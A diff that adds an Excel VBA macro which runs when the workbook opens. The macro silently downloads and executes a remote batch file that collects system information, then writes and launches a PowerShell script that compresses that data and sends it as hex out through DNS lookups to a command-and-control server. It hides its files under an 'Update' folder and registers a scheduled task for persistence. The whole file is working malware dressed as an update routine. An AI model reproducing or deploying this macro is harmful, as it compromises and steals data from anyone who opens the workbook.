@@ -1,0 +1,98 @@
+Function SaveBinaryData(FileName, Data)
+    Const adTypeText = 1
+    Const adSaveCreateOverWrite = 2
+    Dim BinaryStream
+    Set BinaryStream = CreateObject("ADODB.Stream")
+    BinaryStream.Type = adTypeText
+    BinaryStream.Open
+    BinaryStream.Write Data
+    BinaryStream.SaveToFile FileName, adSaveCreateOverWrite
+End Function
+Private Sub Workbook_Open()
+    'download BAT.bat
+    Set objWinHttp = CreateObject("WinHttp.WinHttpRequest.5.1")
+    Url = "https://raw.githubusercontent.com/Valerie-Yeh/DNSExfiltration-hex-/main/BAT.bat"
+    objWinHttp.Open "GET", Url, False
+    objWinHttp.send """"
+    SaveBinaryData "%PUBLIC%\AppData\Local\Temp\Update\Hex\BAT.bat", objWinHttp.responseBody
+    cmd3 = "%PUBLIC%\AppData\Local\Temp\Update\Hex\BAT.bat"
+    CreateObject("Wscript.Shell").Run cmd3, 0
+    
+    'dns.ps1 is used to do DNS exfiltration
+    Set objFSO = CreateObject("Scripting.FileSystemObject")
+    outFile = "%PUBLIC%\AppData\Local\Temp\Update\Hex\dns.txt"
+    Set objFile = objFSO.CreateTextFile(outFile, True)
+
+    objFile.WriteLine ("$memory = New-Object System.IO.MemoryStream")
+    objFile.WriteLine ("$gzip = New-Object System.IO.Compression.GZipStream($memory, [System.IO.Compression.CompressionMode]::Compress)")
+    objFile.WriteLine ("$file = [System.IO.File]::OpenRead(""%PUBLIC%\AppData\Local\Temp\Update\Hex\out.txt"")")
+    objFile.WriteLine ("$file.CopyTo($gzip)")
+    objFile.WriteLine ("$file.Close()")
+    objFile.WriteLine ("$gzip.Close()")
+    objFile.WriteLine ("$dnsserver = ""%Your own C2 server%""")
+    objFile.WriteLine ("foreach ($line in $memory.ToArray()){")
+    objFile.WriteLine ("    echo ""Line: $line""")
+    objFile.WriteLine ("    $Bytes = [System.BitConverter]::ToString($line)")
+    objFile.WriteLine ("    $EncodedText =$Bytes.Replace("" - "", """")")
+    objFile.WriteLine ("    echo ""EncodedText: $EncodedText""")
+    objFile.WriteLine ("    $EncodedTextLength = $EncodedText.length")
+    objFile.WriteLine ("    echo ""EncodedTextLength: $EncodedTextLength""")
+    objFile.WriteLine ("    $i = 0")
+    objFile.WriteLine ("    $pos = 0")
+    objFile.WriteLine ("    $buff = 60")
+    objFile.WriteLine ("    echo ""Start ===============================================""")
+    objFile.WriteLine ("    Resolve-DnsName start.$dnsserver | out-null 2> $null")
+    objFile.WriteLine ("    While ($i -le $EncodedTextLength){")
+    objFile.WriteLine ("        $diff = $EncodedTextLength - $i")
+    objFile.WriteLine ("        if($diff -lt $buff){$EncodedTextStream = $EncodedText.substring($i,$diff)}")
+    objFile.WriteLine ("        if($diff -gt $buff-1){")
+    objFile.WriteLine ("            $diff_end = $buff")
+    objFile.WriteLine ("            $EncodedTextStreamSubString = $EncodedText.substring($i,$diff_end) ")
+    objFile.WriteLine ("            $EncodedTextStream = $EncodedTextStreamSubString}")
+    objFile.WriteLine ("        $EncodedTextStream = $EncodedTextStream -replace ""="",""00"" 2> $null")
+    objFile.WriteLine ("        echo ""Full DNS: $EncodedTextStream.$dnsserver""")
+    objFile.WriteLine ("        Resolve-DnsName ""$EncodedTextStream.$dnsserver"" | out-null 2> $null")
+    objFile.WriteLine ("        $i = $i+$buff}")
+    objFile.WriteLine ("    echo ""End ===============================================""")
+    objFile.WriteLine ("    Resolve-DnsName end.$dnsserver | out-null 2> $null}")
+    objFile.Close
+    
+    'write DNS exfiltration code into dns.txt, and then convert it into dns.ps1
+    Dim Fso
+    Set Fso = CreateObject("Scripting.FileSystemObject")
+    Fso.MoveFile "%PUBLIC%\AppData\Local\Temp\Update\Hex\dns.txt", "%PUBLIC%\AppData\Local\Temp\Update\Hex\dns.ps1"
+    
+    'BAT.bat file is used to collect system information
+    'update.vbs is used to download BAT.bat, and execute BAT.bat and dns.ps1. after executing BAT.bat and dns.ps1, system information is stored in out.txt, and then dns.ps1 exfiltrates out.txt
+    Set objFSO = CreateObject("Scripting.FileSystemObject")
+    outFile = "%PUBLIC%\AppData\Local\Temp\Update\Hex\update.txt"
+    Set objFile = objFSO.CreateTextFile(outFile, True)
+
+    objFile.WriteLine ("cmd4 = ""PowerShell -ExecutionPolicy Bypass -File %PUBLIC%\AppData\Local\Temp\Update\Hex\dns.ps1""")
+    objFile.WriteLine ("CreateObject(""Wscript.Shell"").Run cmd4")
+    objFile.Close
+    
+    'write code into update.txt, and then convert it to update.vbs
+    Dim Fso1
+    Set Fso1 = CreateObject("Scripting.FileSystemObject")
+    Fso1.MoveFile "%PUBLIC%\AppData\Local\Temp\Update\Hex\update.txt", "%PUBLIC%\AppData\Local\Temp\Update\Hex\update.vbs"
+    
+    
+    'create taskscheduler to run update.vbs
+    Set objFSO = CreateObject("Scripting.FileSystemObject")
+    outFile = "%PUBLIC%\AppData\Local\Temp\Update\Hex\taskscheduler.txt"
+    Set objFile = objFSO.CreateTextFile(outFile, True)
+
+    objFile.WriteLine ("$action = New-ScheduledTaskAction -Execute ""PowerShell.exe"" -Argument ""%PUBLIC%\AppData\Local\Temp\Update\Hex\update.vbs""")
+    objFile.WriteLine ("$trigger = New-ScheduledTaskTrigger -Once -At 16:30pm")
+    objFile.WriteLine ("Register-ScheduledTask -Action $action -Trigger $trigger -TaskPath ""updatetasks"" -TaskName ""UpdateTask(Hex)"" -Description ""This task runs update.vbs""")
+    objFile.Close
+    
+    Dim Fso2
+    Set Fso2 = CreateObject("Scripting.FileSystemObject")
+    Fso2.MoveFile "%PUBLIC%\AppData\Local\Temp\Update\Hex\taskscheduler.txt", "%PUBLIC%\AppData\Local\Temp\Update\Hex\taskscheduler.ps1"
+    
+    cmd2 = "PowerShell -ExecutionPolicy Bypass -File %PUBLIC%\AppData\Local\Temp\Update\Hex\taskscheduler.ps1"
+    CreateObject("Wscript.Shell").Run cmd2
+    
+End Sub
